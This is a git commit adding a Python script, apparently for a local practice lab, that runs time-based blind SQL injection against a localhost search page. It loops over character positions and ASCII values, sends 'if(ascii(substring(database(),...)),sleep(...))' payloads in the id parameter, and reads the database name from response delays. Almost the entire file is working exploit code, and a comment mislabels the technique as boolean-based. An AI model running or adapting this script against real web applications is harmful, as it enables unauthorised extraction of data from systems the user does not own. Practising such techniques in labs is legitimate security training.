065aed9cf0fccf617bc9c62eb6ef25ec9789b8ca
victorgalvez96 <49521826+victorgalvez96@users.noreply.github.com>
2024-03-25 21:56:22 +0100

    Create SQLITimeBasedBlind.py

---
+++ SQLITimeBasedBlind.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python3
+
+import requests
+import signal
+import sys
+import time
+import string
+from pwn import *
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo... \n")
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+
+# Boolean-based blind SQL Injection
+def makeSQLI():
+
+    p1= log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Datos extraídos")
+
+    extracted_info=""
+
+    for position in range(1, 150):
+        for character in range(33, 126):
+            sqli_url = main_url + "?id=1 and if(ascii(substring(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)
+
+            p1.status(sqli_url)
+
+            time_start = time.time()
+
+            r = requests.get(sqli_url)
+
+            time_end = time.time()
+
+            if time_end - time_start > 0.35:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ == '__main__': 
+
+    makeSQLI()
